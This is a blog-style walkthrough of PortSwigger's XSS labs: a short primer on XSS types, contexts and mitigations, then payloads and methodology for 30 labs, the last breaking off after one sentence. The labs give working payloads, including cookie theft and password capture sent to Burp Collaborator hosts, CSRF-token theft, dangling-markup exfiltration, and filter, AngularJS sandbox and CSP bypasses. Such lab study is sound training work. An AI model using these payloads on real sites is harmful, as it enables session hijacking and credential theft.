---
title: Walkthrough - XSS Portswigger labs 
date: 2025-07-28 3:30:00 + 05:30
categories: [OSCP Prep, Web]
tags: [oscp, XSS]    # TAG names should always be lowercase
description: An intro to Cross Site Scripting and walkthrough of all 30 portswigger labs
---

This week, I solved all 30 labs on Portswigger to learn about this vulnerability. Below is a brief description of this vulnerability and after that there is a detailed walkthrough for each of the labs. A huge shoutout to [TCE on Youtube](https://www.youtube.com/@TheCyberExpert), as I wouldn't have been able to finish most of these without help from his walkthrough livestreams. Do check out his channel.

## Everything about XSS

##### 1. What is Cross-Site Scripting (XSS)?

XSS is a web vulnerability that lets attackers inject malicious JavaScript into websites, affecting users who visit them. It breaks the browser’s same-origin policy, allowing attackers to access or manipulate sensitive data, impersonate users, or perform actions on their behalf.

##### 2. Types of XSS

- Reflected XSS:  
    Payload is included in the URL or request and reflected in the response.  
    Triggers when a victim clicks a crafted link.
- Stored XSS:  
    Payload is saved on the server (e.g. in a comment).  
    Triggers automatically when any user views the affected page.    
- DOM-based XSS:  
    Vulnerability is in client-side JavaScript.  
    Malicious input flows from a source (like `location.search`) to a dangerous sink (like `innerHTML` or `eval()`).

##### 3. Common Sources & Sinks

- Sources (attacker-controlled input):  
    `location.search`, `document.referrer`, `document.cookie`, `location.hash`
- Sinks (can be remembered as destinations) (where input gets injected dangerously):  
    `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, jQuery DOM functions (`html()`, `append()`, `attr()`)    

##### 4. XSS Contexts (Where Injection Lands)

- HTML Context:  
    Input lands between tags — e.g., `<p>INPUT</p>`
- Attribute Context:  
    Inside tag attributes — e.g., `<a href="INPUT">`
- JavaScript Context:  
    Inside a `<script>` block or inline JS — e.g., `var msg = 'INPUT';`
- Event Handler Context:  
    In attributes like `onclick`, `onerror` — e.g., `<img src=x onerror="INPUT">`
- Template Literal Context:  
    Inside backtick-quoted JS — e.g., `` `Hello ${INPUT}` ``
- CSP-Restricted Context:  
    Environment has a Content Security Policy; payloads need to bypass script restrictions (e.g., using image requests or sandbox escapes)    

##### 5. Impact of XSS

- Steal cookies, session tokens, or credentials    
- Hijack user accounts or impersonate users
- Modify site content (defacement)    
- Bypass CSRF protections by stealing tokens
- Perform actions as the victim (e.g., fund transfers, message sending)

##### 6. Mitigations

- Input Validation: Filter user input strictly based on expected format
- Output Encoding: Encode data before rendering it in HTML, JS, or attributes
- CSP: Use Content Security Policy to limit script execution    
- Secure Frameworks: Use libraries with built-in protections (e.g., React auto-escapes output)

##### 7. Common Bypasses

- Use tags like `<img>` or `<svg>` with `onerror`/`onload` handlers
- Break out of attributes or JS strings using quotes or special chars
- Encode payloads (e.g., `&lt;script&gt;`) to sneak past filters
- Use framework-specific tricks (e.g., Angular sandbox escapes, CSP policy injection)

## Labs

### 1. Reflected XSS into HTML context with nothing encoded

Payload that worked: 

```
<script>alert(1)</script>
```

Explanation:

This is a reflected XSS where unsanitized input is injected into the HTML and executed by the browser. The script runs only when a victim clicks a crafted URL, making it a one-time, user-triggered attack.

![](/assets/images/XSS/Pasted%20image%2020250723132322.png)

### 2. Stored XSS into HTML context with nothing encoded

Payload that worked: 

```
<script>alert(1)</script>
```

Explanation:

This lab has a stored XSS vulnerability, where the payload is saved on the server (in this case in a comment) and executed whenever the page is viewed. Since the input isn’t sanitized or encoded, the browser runs the script automatically. Unlike reflected XSS, this affects every user who loads the page.

![](/assets/images/XSS/Pasted%20image%2020250723132917.png)

### 3. DOM XSS in `innerHTML` sink using source `location.search`

Payload that worked: 

```
"> <script>alert(1)</script>
```

Methodology and explanation:

In the image below, we can see that searching for a string, let's say "hello" gets put in the img tag. There is a function `trackSearch` that accepts unsanitized `query` parameter that we can use to inject javascript into document.write and execute the payload.

![](/assets/images/XSS/Pasted%20image%2020250723143430.png)


```
<img src="/resources/images/tracker.gif?searchTerms='+query+'">
```

query --> `"> <script>alert(1)</script>`
The "> closes the img tag and the script tags execute the payload. 

Official walkthrough solution:

```
"><svg onload=alert(1)>
```

Basically, closing the IMG tag is important.

### 4. DOM XSS in `innerHTML` sink using source `location.search`

Payloads that worked: 

1. The one I tried:
 
```
<svg onload=alert(1)>
```

2. The one in the walkthrough

```
<img src=1 onerror=alert(1)>
```

Methodology and explanation:

Checking out the source code in the webpage (image below) reveals that the doSearchQuery writes the query to the span with id searchMessage using innerHTML.

![](/assets/images/XSS/Pasted%20image%2020250723201231.png)

Well seems simple, so I tried the normal <script>alert(1)</script> payload. And it didn't work. 

![](/assets/images/XSS/Pasted%20image%2020250723202528.png)

As seen, it does get embedded in the page but it doesn't run. But why? This is because of .innerHTML and the way it handles script tags.

Both Lab 3 and 4 are based on DOM based XSS but the script tags don't work in Lab 4 because `document.write()` injects HTML into the live parser stream, so `<script>` tags are executed like normal page content. `innerHTML` modifies the DOM directly, skipping the parser, so script tags are inserted but never run.  That’s why `innerHTML` needs tricks like `onerror` or `onload` to trigger JavaScript.

For further reference I found this post which helped me - https://security.stackexchange.com/questions/60861/why-are-scripts-injected-through-innerhtml-not-executed-whilst-onerror-and-other

### 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

Payload that worked

```javascript
javascript:alert(1)
```

Methodology and explanation:

Reading the source code says that the function is taking `returnPath`'s value and writing it to `href` parameter in the hyperlink (a) tag which has id=backLink.

![](/assets/images/XSS/Pasted%20image%2020250723232753.png)

Changing the `returnPath` parameter in the URL from / to any random string will do the trick. Clicking on the back button will trigger the payload.

https://LABID.web-security-academy.net/feedback?returnPath=hello

![](/assets/images/XSS/Pasted%20image%2020250723233435.png)

If I click on back now, this will redirect to hello, which will be not found. We can try this payload too:

```
https://LABID.web-security-academy.net/feedback?returnPath=http://www.google.com
```

Clicking on back will redirect to Google. Now just put in the javascript alert payload and click back to solve the lab.

NOTE that this is a problem with the old version of jQuery. Check out - CVE-2011-4969 https://github.com/advisories/GHSA-579v-mp3v-rrw5 

### 6. DOM XSS in jQuery selector sink using a hashchange event

Payload that worked:

```
<iframe src="https://LABID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

Methodology and explanation:

In the source code, we see that whenever a hash is added to the URL (e.g. `#section-title`), the page automatically scrolls to the matching section header.

![](/assets/images/XSS/Pasted%20image%2020250724111705.png)

This behavior is not vulnerable by itself. However, due to the use of a vulnerable jQuery version (1.x), attacker-controlled input inside `window.location.hash` gets parsed unsafely. You can read more about this vulnerability here: [https://nvd.nist.gov/vuln/detail/CVE-2015-9251](https://nvd.nist.gov/vuln/detail/CVE-2015-9251)

A malicious payload like this triggers XSS directly:

```
https://LABID.web-security-academy.net/#<img src=x onerror=print()>
```

To solve the lab, you must simulate a phishing attack, sending the malicious link to a victim. This is done via an iframe on the exploit server:

```
<iframe src="https://LABID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

This iframe appends the payload to the URL after loading the lab page, triggering the DOM XSS automatically.

### 7. Reflected XSS into attribute with angle brackets HTML-encoded

Payload that worked:

```
a" autofocus onfocus="alert(1)"
``` 

Methodology and explanation:

The regular payload with script tags does get embedded but doing 'edit as HTML' shows us that the <> tags are getting html encoded. We can also see that there is a reflection point in the input tag in the value attribute. We can attempt to break out of the value attribute and execute our payload.

![](/assets/images/XSS/Pasted%20image%2020250724232129.png)

What we have:

```
<input type="text" placeholder="Search the blog..." name="search" value="STUFF HERE">
```

Now to escape the attribute, we will first put a random character or string and close it with a quote. Then we will put the payload in.

```
a" autofocus onfocus="alert(1)"
```

This payload tells the browser to autofocus to the input element and onfocus, execute alert(1).

I also tried:

```
a" onfocus="alert(1)" autofocus
```

However, for this, I needed to click on the input element for it to work, seems like autofocus must be put in first.

### 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded

Payload that worked:

```
javascript:alert(1)
```

Methodology and explanation:

The description says that the XSS is inside the comment functionality, so we can try to use it and see where the comment lands.

![](/assets/images/XSS/Pasted%20image%2020250725001242.png)

Looking at the source code using inspect element, we can see that the website I put in goes to href attribute in the link tag. 

![](/assets/images/XSS/Pasted%20image%2020250725001455.png)

We had exploited a similar condition in Lab 5 where there was href. Using the same payload `javascript:alert(1)` works. Clicking on the name after injecting this payload will trigger the XSS alert.

### 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded

Payload that worked:

```
a'; alert(1);//
```

Methodology and explanation:

Reading the source code shows that the query is reflected at 3 places. 
1. In the H1 tag, but since we know that the <> tags are getting encoded, this isn't of any use. 
2. Within the script tag in var searchTerms line. (This is vulnerable)
3. In the img tag. (Doesn't work, we will get to why later)

![](/assets/images/XSS/Pasted%20image%2020250725002424.png)

```
var searchTerms = 'hello';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

Now, we will just put in a character, close the string, add the payload and comment out the rest of the line. So it should look something like `RANDOMSTRING'; alert(1);//`

Why the payload doesn't work in img tag. 
1. A regular payload with script tags won't work as encodeURIComponent() function encodes it. 
2. The alert doesn't get parsed to it as the var searchTerm line is closed with the quote and ended with a semi-colon, and the payload is added after that.

### 10. DOM XSS in `document.write` sink using source `location.search` inside a select element

Payload that worked:

```
<script>alert(1)</script>
```

Methodology and explanation:

The site has a functionality of checking for the available stock of a certain item in one of the locations selected through a drop down list. At first there seemed no reflection points but by checking the request in Burp Suite, we can see a `storeId` parameter being passed in the POST request. 

![](/assets/images/XSS/Pasted%20image%2020250725010731.png)

Changing the `storeId` parameter after capturing the request didn't work. Then I tried to put it with the `productId` in the URL itself.

```
https://LAB.web-security-academy.net/product?productId=1&storeId=hello
```

As we can see, the string is inside the option tags.

![](/assets/images/XSS/Pasted%20image%2020250725011843.png)

Since there is no encoding, a simple `<script>alert(1)</script>` does the job.

### 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Payload that worked:

```javascript
{{constructor.constructor('alert(1)')()}}
```

Methodology and explanation:

This site does use angularJS. It considers anything inside {{}} - double curly brackets to be a part of its code and executes its. Putting in {{1+1}} will display 2.

![](/assets/images/XSS/Pasted%20image%2020250725013136.png)

Referring to this cheatsheet https://portswigger.net/web-security/cross-site-scripting/cheat-sheet we can find a simple payload for AngularJS XSS. Other payloads may also work.

### 12. Reflected DOM XSS

Payload that worked:

```
\"};alert(1);//
```

Methodology and explanation:

Based on inspecting the page, we can see that there are script tags calling a searchResults.js script from the resources directory. We can also see a search function which seems to be running on the query we input to the search functionality on the page.

![](/assets/images/XSS/Pasted%20image%2020250725013823.png)

Navigating to the /resources/searchResults.js we can see the entire code. We can see that there is an eval function within this code, which is taking our query from the search box. 

![](/assets/images/XSS/Pasted%20image%2020250725014113.png)

This is similar to Lab 9, where we escaped javascript code in which a variable was being declared. The same payload `a'; alert(1); //` should work here as well. However it didn't work.

Looking at the requests and responses in BurpSuite shows that we are getting responses in json format. It looks like an API endpoint (source: chatGPT, I don't have much experience with API hacking).

![](/assets/images/XSS/Pasted%20image%2020250725014917.png)

We need to bypass the json format and get it to execute the XSS. Playing around with it finally gets us the following payload:

```
\"};alert(1);// 
```

![](/assets/images/XSS/Pasted%20image%2020250725015749.png)

Explanation : 
1. We first use backslash to escape the double quote and then use the curly bracket and semi-colon to complete the json structure.
2. We then simply put the XSS payload and comment out the rest of the remaining json.

### 13. Stored DOM XSS

Payload that worked:

```
<> <img src=x onerror=alert(1)> <>
```

Methodology and explanation:

We start by testing the standard payload:

![](/assets/images/XSS/Pasted%20image%2020250725021204.png)

Strangely, the script tag ending it disappears

![](/assets/images/XSS/Pasted%20image%2020250725021238.png)

I tried to use the tags twice to see the logic. It seems that, the first occurrence is getting HTML encoded and the last one is getting deleted

![](/assets/images/XSS/Pasted%20image%2020250725021418.png)

I confirmed that in the previous case the tag was html encoded:

![](/assets/images/XSS/Pasted%20image%2020250725021631.png)

Now the script tags should work in theory, but it doesn't work so we can try using the img tag with the following payload. The last brackets will get deleted, and the first one will get encoded. The middle one executes as intended.

```
<> <img src=x onerror=alert(1)> <>
```

### 14. Reflected XSS into HTML context with most tags and attributes blocked

Payload that worked:

```
<iframe src="https://LABID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

Methodology and explanation:

Well, this is a simple but longer lab. I don't have burp pro at the time of writing this so I had to refer to a walkthrough (intruder is too slow on the community edition). I will get burp pro soon. Anyways, steps to reproduce:

1. Injected a normal XSS payload and found it to be blocked
2. Copied a list of tags to the intruders and fuzzed for a valid tag. `body` tag worked.
3. Again used intruder and a list of attributes to see what works. Found on `onresize` to be working.
4. Used `body` tag with `onresize` to craft a payload, used `onload` attribute to forcibly resize the page to trigger the payload.

### 15. Reflected XSS into HTML context with all tags blocked except custom ones

Payload that worked:

```
<hello id=x onfocus=alert(document.cookie) tabindex=0>Hello</hello>
```

Methodology and explanation:

We know that only custom tags will work here, so we create a custom tag `hello`. We use an `onfocus` attribute like we did in Lab 7 - Reflected XSS into attribute with angle brackets HTML-encoded. At first, we tried using `autofocus` to trigger the payload, but it didn't work — likely because custom elements cannot receive focus automatically via `autofocus`. Instead, we use `tabindex=0` to make the element programmatically focusable, and we use `id` to create a target for the URL fragment (`#x`) to jump to and trigger focus.

We can try to send it as iframe like we did on `6. DOM XSS in jQuery selector sink using a hashchange event` but upon viewing the exploit, it seems to be failing

```
<iframe src="https://LABID.web-security-academy.net/?search=%3Chello+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D0%3EHello%3C%2Fhello%3E/#x"></iframe>
```

Therefore in order to exploit it, we can use script tags and assign the malicious URL to a location keyword. This will autodirect to our exploit, triggering the payload

```
<script>
location='https://LABID.web-security-academy.net/?search=%3Chello+id%3Dx+onfocus%3Dalert%281%29+tabindex%3D0%3Ehello%3C%2Fhello%3E#x';
</script>
```

### 16. Reflected XSS with some SVG markup allowed

Payload that worked:

```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

Methodology and explanation:

We can refer to the XSS cheatsheet and try a bunch of SVG payloads. I tried it manually as the intruder will still be slow on burp suite community edition.

Other payloads may work as well, this is the first one that gave me a result.

### 17. Reflected XSS in canonical link tag

Payload that worked:

```
?hello=1%27accesskey=%27x%27onclick=%27alert(1)
```

Methodology and explanation:

![](/assets/images/XSS/Pasted%20image%2020250726013105.png)

We need to figure out a way to escape the href attribute.

For this, we can try to add various characters. Trying single quote worked ?hello=1%27, as we can see, in the URL it is auto encoded. But in the source code, it isn't and also, a space was added before it.

![](/assets/images/XSS/Pasted%20image%2020250726013404.png)

I then tried to add accesskey='x' by which we can trigger an XSS when the victim presses the key X. But as per the source code, it looks like the single quotes are getting automatically converted to double quotes and a space is being added after them and not before.

![](/assets/images/XSS/Pasted%20image%2020250726013547.png)

I then tried adding onclick=alert(1) but it somehow didn't work.

![](/assets/images/XSS/Pasted%20image%2020250726014235.png)

As we can see, a double quote was added after the equals sign and a single quote which I had not added suddenly appeared with a backslash.

I tried to close the double quote with a single quote which I hoped would convert to a double quote as per our logic but it didn't work

![](/assets/images/XSS/Pasted%20image%2020250726014350.png)

After some more trial and errors this is what finally worked:

```
https://LABID.web-security-academy.net/?hello=1%27accesskey=%27x%27onclick=%27alert(1)
```

This particular lab was strange and I am not sure I understand it completely.

### 18. Reflected XSS into a JavaScript string with single quote and backslash escaped

Payload that worked:

```
</script><script>alert(1)</script>
```

Methodology and explanation:

Putting in a random string and checking the source code shows us that we are inside a pair of script tags 

![](/assets/images/XSS/Pasted%20image%2020250726113402.png)

First we can try the payload from `9. Reflected XSS into a JavaScript string with angle brackets HTML encoded`

```
a'; alert(1);//
```

![](/assets/images/XSS/Pasted%20image%2020250726113642.png)

As we can see, the single quote is escaped. However angled brackets aren't encoded/escaped. We can simply end the current script tag we are in preemptively and then put the payload in a new pair of script tags.

![](/assets/images/XSS/Pasted%20image%2020250726113742.png)

As we can see, it did the trick. This should trigger our payload.

### 19. Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Payload that worked:

```
\';alert(1);//
```

Methodology and explanation:

![](/assets/images/XSS/Pasted%20image%2020250726120350.png)

Very similar to `18. Reflected XSS into a JavaScript string with single quote and backslash escaped` but in this lab even the angle brackets are html encoded. Therefore we cannot just put the payload in a script tags. We can see that in the screenshot below.

![](/assets/images/XSS/Pasted%20image%2020250726120554.png)

Now in order to trigger the XSS, we need to first close the single quotes. Since it is getting escaped, we will just put a backslash in to escape it. Then we can put a semicolon to end that line.  We did so with the following payload.

```
\';hello
```

As we can see hello, it outside the quote. 

![](/assets/images/XSS/Pasted%20image%2020250726120903.png)

Now we can just put the XSS payload in place of hello and comment out the rest of the line. 

### 20. Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Payload that worked:

```
http://website&#x27;-alert(1)-&#x27;
```

Methodology and explanation:

We start by filling in the comment box and find that the reflection point is inside a `a` tag in its onclick attribute.

![](/assets/images/XSS/Pasted%20image%2020250726191709.png)

![](/assets/images/XSS/Pasted%20image%2020250726194322.png)

We can try to encode the single quote in order to bypass the rule. URL encoding failed but HTML encoding work.

Payload - `http://website&#x27;)hello` as we can see, hello was outside the round bracket. we can use another encoded single quote to close the other quote on the right.

![](/assets/images/XSS/Pasted%20image%2020250726194800.png)

Now we just need to put alert(1) in place of hello. This is where the trick comes in which I wasn't aware about. We need to use the minus signs (in the words of chatGPT) so that javascript can coerce strings into numbers.

But first, I was making a mistake. There is no need to put a ) to close the track function. This is causing syntax errors. We must skip that.

![](/assets/images/XSS/Pasted%20image%2020250726195922.png)

Removing that ) and escaping the extra ' at the end with a &#x27; should solve this lab.

![](/assets/images/XSS/Pasted%20image%2020250726195902.png)

This is a particularly weird concept to get your head around. I don't know javascript so it is hard for me as well, however take a look at the screenshot below from the explanation I got from GPT, this cleared a lot of things for me and should help. We can see both, the failed payload as well as the working one. The difference in the colour should resolve any doubt.

![](/assets/images/XSS/Pasted%20image%2020250726200908.png)

### 21. Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

Payload that worked:

```javascript
${alert(1)}
```

Methodology and explanation:

We start as usual by putting in a random string in search box. We can see that the message is between backticks \` \` . 

![](/assets/images/XSS/Pasted%20image%2020250726201718.png)

Upon looking up their significance, I saw that they can have 1. Multiline strings and 2. display a variable inside the string using ${variable name}. This is similar to f strings in python. We can just put the payload in the ${} and it should execute. 

### 22. Exploiting cross-site scripting to steal cookies

Payload that worked:

```
<script>fetch('https://BURPID.oastify.com/?cookie=' + document.cookie);</script>
```

Methodology and explanation:

As always we first try to find a reflection point. The comments seemed to be reflected in a pair \<p\> tags. I tried putting in the alert(1) payload in script tags and it worked. 

![](/assets/images/XSS/Pasted%20image%2020250726232207.png)

Note: We can do this cookie stealing attack without burp collaborator, but we were forced to do it with it because of safety issues. Otherwise we can point the payload to a html page we host on a server which will execute a javascript file which will send us the cookies back. HTB Academy has a bunch of payloads and a practice lab where we can do this without collaborator. Anyways, I was making a mistake with quotes:

```
<script>fetch('https://BURPID.oastify.com/?cookie=document.cookie');</script>
```

The `document.cookie` must be outside the URL quotes to work. The following payload should work. 

```
<script>fetch('https://BURPID.oastify.com/?cookie=' + document.cookie);</script>
```

### 23. Exploiting cross-site scripting to capture passwords

Payload that worked:

```
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

Methodology and explanation:

As the previous lab - `22. Exploiting cross-site scripting to steal cookies` the reflection point was in the comment section.

![](/assets/images/XSS/Pasted%20image%2020250726235143.png)

This is one of the most interesting scenarios. I had to refer to the solution. As per my understanding, this abuses the autofill feature in browsers. Basically every time the browser detects the elements with names `username` and `password` it will autofill the saved passwords. As per our payload, it should trigger every time the length of the password field changes. We get a response like the one in the screenshot below.

![](/assets/images/XSS/Pasted%20image%2020250727000347.png)

Simply use the credentials to login.

### 24. Exploiting XSS to bypass CSRF defenses 

Payload that worked:

```
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```

Methodology and explanation:

We did a CSRF here using XSS. We used a stored XSS in the comments section to steal the CSRF token of another user. CSRF is a basically when the browser performs unauthorized/unwanted actions, in this case stealing the CSRF token. I had to use the solution myself as this is the first time I am doing a CSRF attack and I don't know javascript as of now. 

### 25. Reflected XSS with AngularJS sandbox escape without strings

Payload that worked:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings)

```javascript
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

Methodology and explanation:

As per the lab instructions, we can't use eval() which we had tried in `12. Reflected DOM XSS`. However, the $parse{} function that is parsing the `key` parameter should do the trick. That seems like a point to enter our payload.

![](/assets/images/XSS/Pasted%20image%2020250727012634.png)

This fails in the first try. It looks like the code is making a dictionary. So we can try to add another entry to this using &. ?search=hello&2%2b2=1. %2b is url encoded + sign. We get a result of 4, meaning this new parameter is working as intended.

![](/assets/images/XSS/Pasted%20image%2020250727014146.png)

Now the payload in place of 2+2 should do the job. We will URL encode the payload and send it. 

Understanding the payload:

A sandbox is like a virtual environment within which the code is running. It is not supposed to leave this environment.

This payload has 2 main parts.
a. Breaking the sandbox - `toString().constructor.prototype.charAt = [].join;`
Overwrites the `charAt` function used by AngularJS for security checks, disabling the sandbox.
b. Executing the payload - `[1,2] | orderBy: toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
Passes a string (built without quotes) - `"x=alert(1)"`, to the `orderBy` filter, which gets executed now that the sandbox is broken.

### 26. Reflected XSS with AngularJS sandbox escape and CSP

Payload that worked:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected-1-all-versions-(all-browsers)-shorter-using-assignment

```
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
```

Methodology and explanation:

Searching for a string like Hello doesn't do much. There is barely any javascript source code visible. We can simply try the payloads from the XSS cheatsheet. 

```
https://LABID.web-security-academy.net/?search=%3Cinput+id%3Dx+ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28z%3Dalert%29%281%29%27%3E#x
```

Note that we used \#x to make sure that it focuses on the input tag automatically. 

Next we can just put it in script tags and send it via exploit server

```
<script>
location='https://0a6d006e049eef7b81879d990038001c.web-security-academy.net/?search=%3Cinput+id%3Dx+ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28z%3Dalert%29%28document.cookie%29%27%3E#x'
</script>
```

Understanding the payload:

Content Security Policy is a browser feature for restricting how code runs on browser. 
This payload uses the `ng-focus` directive to execute when the input field is focused, passing `$event.composedPath()` to the `orderBy` filter. The filter argument `'(z=alert)(document.cookie)'` is parsed by Angular as an expression that assigns `alert` to `z` and then immediately calls `z(document.cookie)`, effectively executing `alert(document.cookie)`. Since this code runs entirely within Angular's expression context and avoids inline scripts, `eval`, or quoted strings, it successfully bypasses standard Content Security Policy (CSP) restrictions.

### 27. Reflected XSS with event handlers and `href` attributes blocked

Payload that worked:

```
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">click me</text></a> 
```

![](/assets/images/XSS/Pasted%20image%2020250728000421.png)

Methodology and explanation:

Step one was to create a clickable text element. As per the lab description, it seems like there is an automated script that will execute and try to click on elements with text "click me". We know that \<a\> tags are allowed. We can try to put a bunch of different tags and see which ones are valid in the search box, either manually or using intruder. I found that the svg tag was allowed. Using \<svg\> and \<a\> together to make a clickable link didn't work. 

```
<svg><a>click me</a>
```

A quick google search showed that text tags must be used to put text in the svg tag. 

```
<svg><a><text x="20" y="20">click me</text></a>
```

Now that we have a clickable text link, we need to execute our payload. `href` attributes are blocked otherwise `href=javascript:alert(1)` would have worked like it had in this lab -`5. DOM XSS in jQuery anchor `href` attribute sink using location.search source`. We need to find which other tags are allowed. Manually checking or using intruder shows that `animate` tag is allowed too.

How does animate work?

Example 

```
<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
  <rect width="10" height="10">
    <animate
      attributeName="rx"
      values="0;5;0"
      dur="10s"
      repeatCount="indefinite" />
  </rect>
</svg>
```

This is a sample code from https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/animate. Look at the animate tag. What it does is, that it assigns fills in an attribute `rx` with values `0;5;0` to the tags it is written after. Ignore `dur`, and `repeatCount` for now. So without animate tag and the `dur` and `repeatCount`, the code would look like:

```
<svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
  <rect rx="0;5;0" width="10" height="10">
  </rect>
</svg>
```

Now that we know what the animate tag does, we can use it to execute our XSS payload. We know that \<a\> tag can be used with `href` to execute the payload. Since `href` is blocked, we can try to use it using the trick of `attributeName` and `values` with animate tag. 

```
<svg>
	<a>
		<animate attributeName="href" values="javascript:alert(1)">
		</animate>
		<text x="20" y="20">
			click me
		</text>
	</a> 
```

This payload executes the XSS.

### 28. Reflected XSS in a JavaScript URL with some characters blocked

Payload that worked:

```
1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{'x':'
```

Methodology and explanation:

As per the lab description, the XSS is in the URL:

```
https://LABID.web-security-academy.net/post?postId=1&hello
```

Trying this, we can see that the additional parameter is indeed getting inserted in this fetch function.

![](/assets/images/XSS/Pasted%20image%2020250728011251.png)

The fetch function is URL encoded. It is sending a post request to the backend to retrieve the pages.

```
href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1%26hello'}).finally(_ => window.location = '/')"
```

After URL decoding for better readability, we can see that our payload is `1&hello` and that we must first escape the method and body parameters which are in the curly brackets and also close the curly brackets with the single quote in the end of our injection point.

```javascript
fetch('/analytics',{method:'post',body:'/post?postId=1&hello'}).finally(_=>window.location='/')"
```

The payload should look something like this:

```
1&'},PAYLOADHERE,{'x':'
```

We can read it better in Markdown below about how we have escaped the method and body parameters and also successfully closed the trailing `'}` with `{'x':'`.

```javascript
fetch('/analytics',{method:'post',body:'/post?postId=1&'},PAYLOADHERE,{'x':''}).finally(_=>window.location='/')"
```

The following payload works (explanation below):

```
1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{'x':'
```

Final function looks like this:

```javascript
fetch('/analytics',{method:'post',body:'/post?postId=1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{'x':''}).finally(_=>window.location='/')"
```

Understanding the payload:

1. `1&'},`

Ends the request body with method and body

2. `x=x=>{throw/**/onerror=alert,1337},`

Defines an arrow function assigned to `x`, where the function body immediately throws.

3. `toString=x,` 

Overwrites `toString` with our custom function `x`.

4. `window+'',` 

Forces the browser to evaluate `window` as a string, which in turn triggers `toString()`.  Since we overwrote `toString = x`, this ensures that our malicious function `x` runs.

5. `{'x':'`

Ends the `'}` to make sure the javascript is not broken. This is added to make sure we don't get any syntax errors.

When `window + ''` runs, the `toString()` function is triggered, which we had overwritten as function `x`, which throws an error and calls `alert()`.

### 29. Reflected XSS protected by very strict CSP, with dangling markup attack

Payloads that worked:

```
"></form><form class="login-form" name="evil-form" action="https://BURPID.oastify.com/token" method="GET"><button class="button" type="submit">Click Me</button>
```

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://LABID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil-user&#46;net" />
      <input type="hidden" name="csrf" value="OeyI3k22l5q7AQhX03Ath4sPWICXKQKr" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

```
https://LABID.web-security-academy.net/my-account?id=wiener&email=hello
```

Methodology and explanation:

We find that the reflection point is in the URL which can be seen by appending &email=hello. As we can see, hello got populated in the empty field.

![](/assets/images/XSS/Pasted%20image%2020250728023014.png)

We can now try to make a malicious form and a button within this to steal the CSRF token and send it to the target user.

```
"></form><form class="login-form" name="evil-form" action="https://BURPID.oastify.com/token" method="GET"><button class="button" type="submit">Click Me</button>'
```

![](/assets/images/XSS/Pasted%20image%2020250728023123.png)

We will send this URL to the target user then. remember to remove id=wiener from the URL otherwise it won't work.

```
<script>
location='https://0aa9000303071ad180c844c3009f0057.web-security-academy.net/my-account?&email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://kf34q7u0443cyc1m3246089wzn5et4ht.oastify.com/token%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3EClick%20Me%3C/button%3E'
</script>
```

As we can see, we get the target's CSRF token.

![](/assets/images/XSS/Pasted%20image%2020250728023723.png)

Next we can generate a CSRF PoC (Burp Pro feature) on the change-email request. 

![](/assets/images/XSS/Pasted%20image%2020250728023952.png)

We will copy this PoC.

![](/assets/images/XSS/Pasted%20image%2020250728024028.png)

We just need to replace the CSRF token and the value of the email field and send it to the target via the exploit server.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://LABID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker&#64;evil-user&#46;net" />
      <input type="hidden" name="csrf" value="OeyI3k22l5q7AQhX03Ath4sPWICXKQKr" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

### 30. Reflected XSS protected by CSP, with CSP bypass

Payloads that worked:

```
search=<script>alert(1)</script>&token=1;script-src-elem 'unsafe-inline'
```

Methodology and explanation:

Using the script tags and a simple payload in the search functionality doesn't work. There is no encoding taking place.

